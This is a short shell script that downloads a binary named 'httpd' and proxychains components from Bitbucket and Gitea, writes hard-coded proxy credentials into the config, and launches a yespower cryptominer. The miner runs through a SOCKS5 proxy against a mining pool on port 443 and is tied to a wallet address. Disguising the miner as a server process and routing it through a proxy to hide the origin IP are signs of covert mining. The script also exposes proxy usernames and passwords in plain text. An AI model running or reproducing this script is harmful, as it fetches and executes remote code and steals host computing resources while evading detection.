proxy="54.161.96.109" 
port="9293" 
user="wuoa7gtsevi15f"  
pass="dvjbnzvt6wpy2lghrno6tkkeditg38" 
wget -q -O lx https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x lx
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./lx -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-Samon) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://wuoa7gtsevi15f:dvjbnzvt6wpy2lghrno6tkkeditg38@us-east-static-08.quotaguard.com:1080 
